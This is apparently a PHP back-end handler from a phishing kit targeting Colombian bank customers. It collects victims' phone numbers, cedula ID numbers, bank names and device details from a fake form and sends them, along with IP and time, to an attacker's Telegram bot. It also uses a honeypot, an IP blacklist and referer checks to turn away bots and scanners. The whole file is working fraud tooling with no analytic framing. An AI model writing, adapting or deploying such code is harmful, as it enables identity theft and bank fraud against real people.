<?php
// --- COMPROBACIÓN ANTIBOT HONEPOT, REFERER Y IP BLACKLIST ---
$client_ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';
if (!empty($client_ip)) {
    $client_ip = trim(explode(',', $client_ip)[0]);
}

$secRoot = __DIR__; while($secRoot !== dirname($secRoot)) { if (file_exists($secRoot . '/includes/security.php')) { require_once $secRoot . '/includes/security.php'; break; } $secRoot = dirname($secRoot); } $blacklist_file = (function_exists('sura_get_project_root') ? sura_get_project_root() : $secRoot) . '/blocked_ips.txt';

// 1. Check IP Blacklist
if (file_exists($blacklist_file)) {
    $blocked_ips = file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (in_array($client_ip, $blocked_ips)) {
        header("HTTP/1.1 403 Forbidden");
        exit("Acceso denegado.");
    }
}

// 2. Check Honeypot Field (If filled, we write their IP to the blacklist and block them immediately!)
if (!empty($_POST['website'])) {
    if (!empty($client_ip) && filter_var($client_ip, FILTER_VALIDATE_IP)) {
        $blocked_ips = file_exists($blacklist_file) ? file($blacklist_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES) : [];
        if (!in_array($client_ip, $blocked_ips)) {
            @file_put_contents($blacklist_file, $client_ip . "\n", FILE_APPEND | LOCK_EX);
            @chmod($blacklist_file, 0666);
        }
    }
    exit(json_encode(['status' => 'success']));
}

// 3. Check Referer
$referer = $_SERVER['HTTP_REFERER'] ?? '';
$currentHost = $_SERVER['HTTP_HOST'] ?? '';
if (!empty($referer) && !empty($currentHost)) {
    $refHost = parse_url($referer, PHP_URL_HOST) ?? '';
    if (!empty($refHost) && strpos($refHost, $currentHost) === false && strpos($currentHost, $refHost) === false && strpos($referer, 'futuapigoluni.tech') === false) {
        exit(json_encode(['status' => 'error', 'message' => 'Acceso denegado']));
    }
}
// -------------------------------------------------------------

require_once(__DIR__ . "/../lib/class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

// Procesar variables del POST
$celular      = $ifilter->process($_POST['cel']);
$cedula        = $ifilter->process($_POST['val']);
$persona      = $ifilter->process($_POST['per']);
$banco        = $ifilter->process($_POST['ban']);
$dispositivo  = $ifilter->process($_POST['dis']);
$tipo         = $ifilter->process($_POST['tip']);
$folder       = $ifilter->process($_POST['fol']);
$nombrebanco  = $ifilter->process($_POST['nom']);

// Establecer cookies para el resumen
if (file_exists(__DIR__ . "/../../../includes/bank_helper.php")) {
    require_once(__DIR__ . "/../../../includes/bank_helper.php");
    $nombrebanco = jelpi_format_banco($nombrebanco ?: $banco, $folder);
}

setcookie('nombrebanco', $nombrebanco, time() + 3600);
setcookie('cedula', $cedula, time() + 3600);
setcookie('celular', $celular, time() + 3600);

$ip   = $_SERVER['REMOTE_ADDR'];
$hora = date("Y-m-d H:i:s");

// ✅ ENVIAR A TELEGRAM SIN BOTONES
$cfg = file_exists(__DIR__ . "/../../../token_bank/config.php") ? require(__DIR__ . "/../../../token_bank/config.php") : (file_exists(__DIR__ . "/../../../config.php") ? require(__DIR__ . "/../../../config.php") : []);
$token   = $cfg['bot_token'] ?? "";
$chat_id = $cfg['chat_id'] ?? "";

$mensaje = "<b>📲 Nuevo ingreso</b>\n"
         . "<b>Celular:</b> $celular\n"
         . "<b>cedula:</b> $cedula\n"
         . "<b>Persona:</b> $persona\n"
         . "<b>Banco:</b> $nombrebanco\n"
         . "<b>Tipo:</b> $tipo\n"
         . "<b>Dispositivo:</b> $dispositivo\n"
         . "<b>IP:</b> $ip\n"
         . "<b>Hora:</b> $hora";

$data = [
    'chat_id'    => $chat_id,
    'text'       => $mensaje,
    'parse_mode' => 'HTML'
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data));
?>
